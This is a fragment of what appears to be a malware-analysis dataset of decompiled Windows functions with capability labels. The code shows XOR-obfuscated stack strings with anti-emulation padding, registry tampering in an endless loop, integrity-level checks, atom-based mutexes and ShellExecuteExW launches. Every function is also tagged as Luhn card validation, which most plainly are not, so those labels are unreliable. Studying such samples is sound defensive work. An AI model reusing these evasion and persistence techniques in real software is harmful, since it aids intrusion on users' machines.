 (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &var_8h);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar6 == 0x7a) {\n                        uVar2 = (*pcVar8)(0, var_8h);\n                        dwProcessId = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (dwProcessId != NULL) {\n                            iVar6 = (*pcVar1)(TokenHandle, 1, dwProcessId, var_8h, &var_8h);\n                            if (iVar6 != 0) {\n                                iVar6 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *dwProcessId, var_10h, &var_24h, var_ch, &var_20h, &var_30h);\n                                if (iVar6 != 0) {\n                                    var_60h = 0x32004c11;\n                                    var_5ch = 0x451f4225;\n                                    var_58h = 0x4c0d767b;\n                                    var_54h = 0x424c320b;\n                                    var_50h = 0x766e4510;\n                                    var_4ch = 0x32364c67;\n                                    var_48h = 0x4569422a;\n                                    var_44h = 0x4c1e7641;\n                                    var_40h = 0x42123260;\n                                    var_3ch._0_2_ = 0x454c;\n                                    var_38h = 0x32454c42;\n                                    var_34h._0_1_ = 0x76;\n                                    fcn.00401000(0x4c);\n                                    iVar6 = var_1ch;\n                                    iVar7 = 0;\n                                    iVar4 = &var_60h - var_1ch;\n                                    do {\n                                        iVar5 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                                        if (iVar5 != 0xc8f676) {\n                                            var_1ch = 5;\n                                            *(iVar7 + iVar6) = *(&var_38h + iVar7 % 5) ^ (iVar7 + iVar6)[iVar4];\n                                        }\n                                        iVar7 = iVar7 + 1;\n                                    } while (iVar7 < 0x26);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar6, var_ch, var_10h, pSessionId);\n                                    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    var_1ch = 1;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                                    pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                }\n                            }\n                            uVar2 = (*pcVar8)(0, dwProcessId);\n                            (*pcVar9)(uVar2);\n                        }\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            puVar3 = var_10h;\n        }\n        uVar2 = (*pcVar8)(0, var_ch);\n        (*pcVar9)(uVar2);\n        uVar2 = (*pcVar8)(0, puVar3);\n        (*pcVar9)(uVar2);\n        iVar6 = var_1ch;\n    }\n    return iVar6;\n}\n",
        "token_count": 1521
    },
    "004016b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __fastcall fcn.004016b8(uint param_1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint lpString;\n    uint lpExitTime;\n    uint lpUserTime;\n    uint lpKernelTime;\n    uint var_30h;\n    int32_t hObject;\n    int32_t var_28h;\n    uint lpCreationTime;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = 0;\n    iVar6 = 8;\n    puVar7 = &lpCreationTime;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_28h = 0;\n    puVar7 = &lpExitTime;\n    var_30h = param_1;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpKernelTime;\n    for (iVar4 = iVar6; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpUserTime;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (hObject == 0) goto code_r0x00401820;\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetProcessTimes)(hObject, &lpCreationTime, &lpExitTime, &lpKernelTime, &lpUserTime);\n    if (iVar4 != 0) {\n        var_18h = 0x6c75155d;\n        var_14h = 0x7509407a;\n        var_10h = 0x9407a6c;\n        var_ch._0_1_ = 0x58;\n        var_8h = 0x49587178;\n        var_4h._0_1_ = 0x4a;\n        fcn.00401000(0xd);\n        iVar4 = var_1ch;\n        iVar6 = 0;\n        iVar5 = &var_18h - var_1ch;\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n            if (iVar2 != 0x9fb8aa) {\n                var_1ch = 5;\n                *(iVar6 + iVar4) = *(&var_8h + iVar6 % 5) ^ (iVar6 + iVar4)[iVar5];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0xd);\n        (*_sym.imp.USER32.dll_wsprintfA)(&lpString, iVar4, var_30h, var_20h, lpCreationTime);\n        iVar1 = (*_sym.imp.KERNEL32.dll_FindAtomA)(&lpString);\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GlobalFindAtomA)(&lpString);\n            if (iVar1 == 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(&lpString);\n                (*_sym.imp.KERNEL32.dll_AddAtomA)(&lpString);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                iVar5 = 1;\n                goto code_r0x00401817;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        iVar5 = var_28h;\n    }\ncode_r0x00401817:\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\ncode_r0x00401820:\n    return iVar5 == 0;\n}\n",
        "token_count": 1102
    },
    "0040196a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040196a(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar5 = auStack48;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = 0;\n    arg_8h_00 = 0;\n    uStack40 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    if (iVar2 != 0) {\n        puVar6 = &uStack44;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        uStack28 = 0x4400;\n        uStack44 = 0x418220;\n        uStack40 = 0;\n        uStack24 = 0x6200;\n        uStack36 = 0x412010;\n        uStack32 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.0040182e();\n        if (iVar3 != 0) {\n            iVar3 = fcn.0040182e();\n            arg_8h_00 = -(iVar3 != 0) & 0x10;\n        }\n        do {\n            iVar3 = fcn.00407b36(arg_8h_00);\n            if (iVar3 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x14);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 548
    },
    "004035d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004035d0(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uchar var_16ch;\n    uint var_16bh;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_16ch = 0;\n    sub.ntdll.dll_memset(&var_16bh, 0, 0x103);\n    var_64h = 0;\n    var_60h = 0x7013d36;\n    var_5ch = 0x2200419;\n    var_58h = 0x310c232f;\n    var_54h = 0xa1d1c15;\n    var_50h = 0x392f1334;\n    var_4ch = 0x1c033c0c;\n    var_48h = 0x240e1619;\n    var_68h = 6;\n    var_44h._0_1_ = 6;\n    stack0xffffffb9 = 0x937171c;\n    var_3fh = 0x20003807;\n    var_3bh = 0xb011a14;\n    var_37h = 0x1a1d2e0e;\n    var_33h = 0x16092000;\n    var_2fh = 0x201451a;\n    var_2bh = 0x3c0c1a07;\n    var_27h = 0x3f320000;\n    var_23h = 0x1d16093d;\n    var_1fh = 0x2f037739;\n    var_1bh._0_1_ = 0x6e;\n    var_8h = 0x73675265;\n    var_4h._0_1_ = 0x6e;\n    fcn.00401000(0x46);\n    iVar2 = var_ch;\n    iVar6 = 0;\n    var_10h = 5;\n    iVar5 = &var_60h - var_ch;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar3 != 0x6a1b8e) {\n            *(iVar6 + iVar2) = *(&var_8h + iVar6 % var_10h) ^ (iVar6 + iVar2)[iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x46);\n    var_8h = 0x727f5d5d;\n    var_4h._0_1_ = 0x53;\n    stack0xffffffe4 = 0x424f686f;\n    var_14h._0_2_ = 0x7653;\n    fcn.00401000(5);\n    iVar2 = var_10h;\n    iVar6 = 0;\n    iVar5 = &var_8h - var_10h;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        iVar3 = var_ch;\n        if (iVar4 != 0x6d3635) {\n            puVar1 = iVar6 + iVar2;\n            *puVar1 = *(&var_1bh + iVar6 % var_68h + 3) ^ puVar1[iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 5);\n    do {\n        iVar5 = 0;\n        do {\n            var_ch = 0;\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_16ch, iVar3, iVar5);\n            iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_16ch, &var_ch);\n            if (iVar6 == 0) {\n                var_64h = 3;\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_ch, iVar2, 0, 4, &var_64h, 4);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_ch);\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 5);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 1159
    },
    "004038af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.004038af(int16_t **arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *in_ECX;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    \n    if ((in_ECX == NULL) && (in_ECX = *arg_8h,  *arg_8h == NULL)) {\n        return NULL;\n    }\n    do {\n        piVar2 = in_ECX;\n        piVar4 = 0x40fb4c;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n            if (iVar1 == 0) {\n                piVar4 = piVar2 + 1;\n                if (*piVar2 == 0) {\n                    *arg_8h = NULL;\n                    return NULL;\n                }\n                do {\n                    piVar3 = piVar4;\n                    piVar5 = 0x40fb4c;\n                    piVar4 = piVar3 + 1;\n                    do {\n                        iVar1 = *piVar5;\n                        piVar5 = piVar5 + 1;\n                        if (iVar1 == *piVar3) {\n                            if (*piVar3 == 0) {\n                                piVar4 = NULL;\n                            }\n                            else {\n                                *piVar3 = 0;\n                            }\n                            *arg_8h = piVar4;\n                            return piVar2;\n                        }\n                    } while (iVar1 != 0);\n                } while( true );\n            }\n            in_ECX = piVar2 + 1;\n        } while (*piVar2 != iVar1);\n    } while( true );\n}\n",
        "token_count": 384
    },
    "00404e4e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.00404e4e(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x41ccd0), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x41ccd0));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 115
    },
    "00406b95": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00406b95(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint name;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint hKey;\n    \n    uStack100 = *0x40fbac;\n    uStack104 = *0x40fba8;\n    uStack108 = *0x40fba4;\n    name = *0x40fba0;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x41cd4c;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x40fbb0;\n    uStack92 = *0x40fbb4;\n    uStack88 = *0x40fbb8;\n    uStack84 = *0x40fbbc;\n    var_3ch = *0x40fb90;\n    uStack60 = *0x40fb94;\n    uStack56 = *0x40fb98;\n    uStack52 = *0x40fb9c;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    hKey = 0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar2 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar2)(hKey, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 != 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar2)(hKey, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar1)(hKey);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, &hKey);\n                if ((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar1)(hKey);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar2)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar2)(uVar3);\n        *0x41cd54 = uVar10 ^ uVar8;\n        *0x41cd58 = uVar10 << 10 | uVar10 >> 0x16;\n        *0x41cd4c = uVar8;\n        *0x41cd50 = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1711
    },
    "0040714f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar __fastcall fcn.0040714f(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint32_t *puVar5;\n    char cVar6;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    \n    cVar6 = '\\0';\n    TokenHandle = param_1;\n    TokenInformationLength = param_1;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x7a) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, TokenInformationLength);\n                puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                if (puVar3 != NULL) {\n                    iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                      (TokenHandle, 0x19, puVar3, TokenInformationLength, &TokenInformationLength);\n                    if (iVar1 != 0) {\n                        puVar4 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*puVar3);\n                        if ((puVar4 != NULL) && (*puVar4 != 0)) {\n                            puVar5 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*puVar3, *puVar4 - 1);\n                            if (puVar5 != NULL) {\n                                if (*puVar5 < 0x2000) {\n                                    cVar6 = '\\x01';\n                                }\n                                else {\n                                    cVar6 = '\\x03' - (*puVar5 < 0x3000);\n                                }\n                            }\n                        }\n                    }\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return cVar6;\n}\n",
        "token_count": 525
    },
    "004089a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain obfuscated stackstrings",
            "contain loop",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004089a0(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint pExecInfo;\n    uint var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint *var_88h;\n    uint *var_84h;\n    uint var_7ch;\n    uint hObject;\n    int32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t lpszLongPath;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    sub.ntdll.dll_memset(&lpDst, 0, 0x410);\n    sub.ntdll.dll_memset(&ARG_0, 0, 0x208);\n    sub.ntdll.dll_memset(&lpszShortPath, 0, 0x208);\n    var_44h = 0x77113766;\n    var_40h = 0x66594304;\n    var_3ch = 0x372a6d13;\n    var_38h = 0x43487714;\n    var_34h = 0x6d04666b;\n    var_30h = 0x7715373a;\n    var_2ch = 0x66524319;\n    var_28h = 0x37706d1a;\n    var_24h = 0x43317754;\n    var_20h = 0x6d1a6654;\n    var_1ch = 0x77483727;\n    var_18h = 0x664f4308;\n    var_14h = 0x37436d12;\n    var_8h = 0x77663743;\n    var_4h._0_1_ = 0x6d;\n    fcn.00401000(0x68);\n    iVar4 = var_5ch;\n    iVar8 = 0;\n    var_58h = 5;\n    iVar6 = &var_44h - var_5ch;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar5 != 0xa9ea9f) {\n            puVar1 = iVar8 + iVar4;\n            *puVar1 = *(&var_8h + iVar8 % var_58h) ^ puVar1[iVar6];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x34);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar4, &lpDst, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    var_30h = 0x747a3159;\n    var_2ch = 0x31593604;\n    var_28h = 0x36147477;\n    var_24h = 0x7434310d;\n    var_20h = 0x310d3615;\n    var_1ch = 0x36427475;\n    var_18h = 0x7477310a;\n    var_14h = CONCAT22(var_14h._2_2_, 0x3667);\n    var_10h = 0x74553179;\n    var_ch._0_2_ = 0x3667;\n    fcn.00401000(0x3c);\n    iVar4 = lpszLongPath;\n    iVar8 = 0;\n    var_8h = 6;\n    iVar6 = &var_30h - lpszLongPath;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar5 != 0xa3d270) {\n            puVar1 = iVar8 + iVar4;\n            *puVar1 = *(&var_10h + iVar8 % var_8h) ^ puVar1[iVar6];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar4, &lpszShortPath);\n    sub.ntdll.dll_memset(&pExecInfo, 0, 0x3c);\n    var_54h = 0x31107734;\n    var_50h = 0x6516461b;\n    var_4ch = 0x77467542;\n    var_10h = 0x31657746;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x75);\n    fcn.00401000(0x18);\n    iVar4 = var_8h;\n    iVar8 = 0;\n    iVar6 = &var_54h - var_8h;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar5 != 0xb5b0cd) {\n            *(iVar8 + iVar4) = *(&var_10h + iVar8 % var_58h) ^ (iVar8 + iVar4)[iVar6];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    var_88h = &lpDst;\n    pExecInfo = 0x3c;\n    var_84h = &ARG_0;\n    var_8ch = iVar4;\n    var_7ch = 3;\n    var_94h = 0x40;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    pcVar2 = _sym.imp.USER32.dll_GetForegroundWindow;\n    var_90h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    iVar6 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n    while (iVar6 == 0) {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar6 != 0x4c7) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n        var_90h = (*pcVar2)();\n        iVar6 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    uVar7 = (*pcVar3)(0, lpszLongPath);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_5ch);\n    (*pcVar2)(uVar7);\n    return 1;\n}\n",
        "token_count": 1742
    },
    "00408d6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408d6c(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = *param_2 * 0x19660d + 0x3c6ef35f;\n    *param_1 = iVar1;\n    iVar1 = iVar1 * 0x19660d + 0x3c6ef35f;\n    *(param_1 + 1) = iVar1;\n    iVar1 = iVar1 * 0x19660d + 0x3c6ef35f;\n    uVar2 = 0;\n    *param_2 = iVar1;\n    *(param_1 + 6) = iVar1;\n    do {\n        iVar1 = *param_2 * 0x19660d + 0x3c6ef35f;\n        *(param_1 + uVar2 + 8) = iVar1;\n        uVar2 = uVar2 + 1;\n        *param_2 = iVar1;\n    } while (uVar2 < 8);\n    return;\n}\n",
        "token_count": 253
    },
    "00408ff1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.00408ff1(uint noname_0, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_EDX;\n    int32_t iVar4;\n    ushort *puVar5;\n    uint var_14h;\n    uint lpString2;\n    \n    puVar5 = NULL;\n    iVar4 = 0x27;\n    fcn.00408d6c();\n    iVar2 = fcn.00408dbc();\n    if (iVar2 != 0) {\n        if (in_EDX != 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n            iVar4 = iVar4 + 0x27;\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4 * 2);\n        puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (puVar5 != NULL) {\n            *puVar5 = 0;\n            if (in_EDX != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(puVar5);\n            }\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(puVar5, iVar2);\n        }\n        uVar3 = (*pcVar1)(0, iVar2);\n        